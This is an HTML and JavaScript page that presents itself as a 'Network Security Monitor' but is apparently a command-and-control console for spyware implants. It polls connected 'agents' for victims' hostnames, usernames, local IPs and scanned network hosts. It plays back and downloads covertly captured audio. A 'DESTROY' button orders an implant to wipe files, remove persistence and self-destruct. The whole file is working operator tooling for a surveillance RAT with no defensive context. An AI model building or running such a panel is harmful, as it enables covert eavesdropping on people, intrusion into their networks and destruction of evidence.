<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Network Security Monitor</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Segoe UI', -apple-system, system-ui, sans-serif;
            background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 100%);
            color: #e0e0e0;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        
        header {
            background: rgba(26, 26, 46, 0.8);
            backdrop-filter: blur(10px);
            padding: 25px 30px;
            border-radius: 15px;
            margin-bottom: 30px;
            border: 1px solid rgba(0, 212, 255, 0.2);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }
        
        h1 {
            font-size: 2em;
            background: linear-gradient(135deg, #00d4ff, #00ff88);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 10px;
        }
        
        .stats {
            display: flex;
            gap: 20px;
            margin-top: 15px;
        }
        
        .stat-box {
            background: rgba(0, 212, 255, 0.1);
            padding: 15px 25px;
            border-radius: 10px;
            border: 1px solid rgba(0, 212, 255, 0.3);
        }
        
        .stat-box strong {
            color: #00d4ff;
            font-size: 1.5em;
        }
        
        .agents-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(450px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }
        
        .agent-card {
            background: rgba(26, 26, 46, 0.9);
            backdrop-filter: blur(10px);
            padding: 25px;
            border-radius: 15px;
            border-left: 4px solid #00d4ff;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            transition: all 0.3s ease;
            position: relative;
        }
        
        .agent-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 12px 48px rgba(0, 212, 255, 0.2);
        }
        
        .agent-card.offline {
            border-left-color: #ff4444;
            opacity: 0.6;
        }
        
        .agent-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .agent-title {
            font-size: 1.3em;
            color: #00d4ff;
        }
        
        .status-badge {
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 0.85em;
            font-weight: bold;
        }
        
        .status-online {
            background: rgba(0, 255, 136, 0.2);
            color: #00ff88;
            border: 1px solid #00ff88;
        }
        
        .status-offline {
            background: rgba(255, 68, 68, 0.2);
            color: #ff4444;
            border: 1px solid #ff4444;
        }
        
        .agent-info {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
            margin: 15px 0;
        }
        
        .info-item {
            background: rgba(0, 0, 0, 0.3);
            padding: 10px;
            border-radius: 8px;
        }
        
        .info-label {
            color: #888;
            font-size: 0.85em;
            margin-bottom: 5px;
        }
        
        .info-value {
            color: #fff;
            font-weight: 500;
        }
        
        .network-info {
            margin-top: 15px;
            padding: 15px;
            background: rgba(0, 212, 255, 0.05);
            border-radius: 10px;
            border: 1px solid rgba(0, 212, 255, 0.1);
        }
        
        .network-title {
            color: #00d4ff;
            font-weight: bold;
            margin-bottom: 10px;
        }
        
        .host-list {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            margin-top: 8px;
        }
        
        .host-tag {
            background: rgba(0, 255, 136, 0.1);
            color: #00ff88;
            padding: 4px 12px;
            border-radius: 15px;
            font-size: 0.85em;
            border: 1px solid rgba(0, 255, 136, 0.3);
        }
        
        .actions {
            display: flex;
            gap: 10px;
            margin-top: 20px;
        }
        
        .btn {
            flex: 1;
            padding: 12px;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            font-size: 0.9em;
        }
        
        .btn-listen {
            background: linear-gradient(135deg, #00d4ff, #0080ff);
            color: white;
        }
        
        .btn-listen:hover {
            transform: scale(1.05);
            box-shadow: 0 5px 20px rgba(0, 212, 255, 0.4);
        }
        
        .btn-record {
            background: linear-gradient(135deg, #00ff88, #00cc6a);
            color: white;
        }
        
        .btn-record:hover {
            transform: scale(1.05);
            box-shadow: 0 5px 20px rgba(0, 255, 136, 0.4);
        }
        
        .btn-destroy {
            background: linear-gradient(135deg, #ff4444, #cc0000);
            color: white;
        }
        
        .btn-destroy:hover {
            transform: scale(1.05);
            box-shadow: 0 5px 20px rgba(255, 68, 68, 0.4);
        }
        
        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        
        .audio-player {
            margin-top: 15px;
            padding: 15px;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 10px;
            display: none;
        }
        
        .audio-player.active {
            display: block;
        }
        
        audio {
            width: 100%;
            margin-top: 10px;
        }
        
        .no-agents {
            text-align: center;
            padding: 60px 20px;
            color: #666;
        }
        
        .loading {
            text-align: center;
            padding: 40px;
            font-size: 1.2em;
            color: #00d4ff;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        .pulse {
            animation: pulse 2s ease-in-out infinite;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🛡️ Network Security Monitor</h1>
            <div class="stats">
                <div class="stat-box">
                    <div class="info-label">Total Agents</div>
                    <strong id="totalAgents">0</strong>
                </div>
                <div class="stat-box">
                    <div class="info-label">Online Now</div>
                    <strong id="onlineAgents" style="color: #00ff88;">0</strong>
                </div>
                <div class="stat-box">
                    <div class="info-label">Last Update</div>
                    <strong id="lastUpdate" style="font-size: 0.9em;">Never</strong>
                </div>
            </div>
        </header>
        
        <div id="agentsContainer" class="agents-grid">
            <div class="loading pulse">🔍 Searching for agents...</div>
        </div>
    </div>

    <script>
        const API_URL = window.location.origin;
        let agents = {};
        let audioChunks = {};
        
        async function fetchAgents() {
            try {
                const response = await fetch(`${API_URL}/api/agents`);
                const data = await response.json();
                
                document.getElementById('totalAgents').textContent = data.total;
                document.getElementById('onlineAgents').textContent = data.online;
                document.getElementById('lastUpdate').textContent = new Date().toLocaleTimeString();
                
                agents = {};
                data.agents.forEach(agent => {
                    agents[agent.agent_id] = agent;
                });
                
                renderAgents();
            } catch (error) {
                console.error('Failed to fetch agents:', error);
            }
        }
        
        async function fetchAudio(agentId) {
            try {
                const response = await fetch(`${API_URL}/api/audio?agent_id=${agentId}`);
                const data = await response.json();
                audioChunks[agentId] = data.audio || [];
                return data.audio;
            } catch (error) {
                console.error('Failed to fetch audio:', error);
                return [];
            }
        }
        
        async function playAudio(agentId) {
            const chunks = await fetchAudio(agentId);
            
            if (!chunks || chunks.length === 0) {
                alert('No audio captured yet');
                return;
            }
            
            // Combine all chunks
            const audioData = chunks.map(c => c.data).join('');
            
            // Create audio element
            const audioPlayer = document.getElementById(`audio-${agentId}`);
            audioPlayer.innerHTML = `
                <div style="color: #00ff88; margin-bottom: 10px;">
                    📼 ${chunks.length} audio chunk(s) captured
                </div>
                <audio controls>
                    <source src="data:audio/wav;base64,${audioData}" type="audio/wav">
                </audio>
                <button class="btn btn-record" style="margin-top: 10px;" onclick="downloadAudio('${agentId}')">
                    💾 Download
                </button>
            `;
            audioPlayer.classList.add('active');
        }
        
        function downloadAudio(agentId) {
            const chunks = audioChunks[agentId];
            if (!chunks) return;
            
            const audioData = chunks.map(c => c.data).join('');
            const link = document.createElement('a');
            link.href = `data:audio/wav;base64,${audioData}`;
            link.download = `${agentId}-${Date.now()}.wav`;
            link.click();
        }
        
        async function destroyAgent(agentId) {
            if (!confirm(`⚠️ DESTROY agent ${agentId}?\n\nThis will:\n- Wipe all files\n- Remove persistence\n- Self-destruct`)) {
                return;
            }
            
            try {
                await fetch(`${API_URL}/api/destroy`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ agent_id: agentId })
                });
                
                alert(`💀 Destroy command sent to ${agentId}`);
                delete agents[agentId];
                renderAgents();
            } catch (error) {
                alert('Failed to send destroy command');
            }
        }
        
        function renderAgents() {
            const container = document.getElementById('agentsContainer');
            
            if (Object.keys(agents).length === 0) {
                container.innerHTML = `
                    <div class="no-agents">
                        <h2>No Agents Connected</h2>
                        <p>Waiting for agents to beacon...</p>
                    </div>
                `;
                return;
            }
            
            container.innerHTML = Object.values(agents).map(agent => `
                <div class="agent-card ${agent.online ? 'online' : 'offline'}">
                    <div class="agent-header">
                        <div class="agent-title">${agent.hostname}</div>
                        <span class="status-badge status-${agent.online ? 'online' : 'offline'}">
                            ${agent.online ? '🟢 ONLINE' : '🔴 OFFLINE'}
                        </span>
                    </div>
                    
                    <div class="agent-info">
                        <div class="info-item">
                            <div class="info-label">Agent ID</div>
                            <div class="info-value">${agent.agent_id}</div>
                        </div>
                        <div class="info-item">
                            <div class="info-label">User</div>
                            <div class="info-value">${agent.username}</div>
                        </div>
                        <div class="info-item">
                            <div class="info-label">Platform</div>
                            <div class="info-value">${agent.platform}</div>
                        </div>
                        <div class="info-item">
                            <div class="info-label">Last Seen</div>
                            <div class="info-value">${agent.seconds_ago}s ago</div>
                        </div>
                    </div>
                    
                    ${agent.network ? `
                        <div class="network-info">
                            <div class="network-title">🌐 Network Intelligence</div>
                            <div class="info-item">
                                <div class="info-label">Local IP</div>
                                <div class="info-value">${agent.network.local_ip || 'Unknown'}</div>
                            </div>
                            ${agent.network.active_hosts?.length ? `
                                <div style="margin-top: 10px;">
                                    <div class="info-label">Active Hosts (${agent.network.active_hosts.length})</div>
                                    <div class="host-list">
                                        ${agent.network.active_hosts.slice(0, 8).map(ip => 
                                            `<span class="host-tag">${ip}</span>`
                                        ).join('')}
                                    </div>
                                </div>
                            ` : ''}
                        </div>
                    ` : ''}
                    
                    <div class="actions">
                        <button class="btn btn-listen" onclick="playAudio('${agent.agent_id}')" ${!agent.online ? 'disabled' : ''}>
                            🎧 Listen
                        </button>
                        <button class="btn btn-destroy" onclick="destroyAgent('${agent.agent_id}')">
                            💀 DESTROY
                        </button>
                    </div>
                    
                    <div id="audio-${agent.agent_id}" class="audio-player"></div>
                </div>
            `).join('');
        }
        
        // Auto-refresh every 5 seconds
        setInterval(fetchAgents, 5000);
        fetchAgents(); // Initial load
    </script>
</body>
</html>
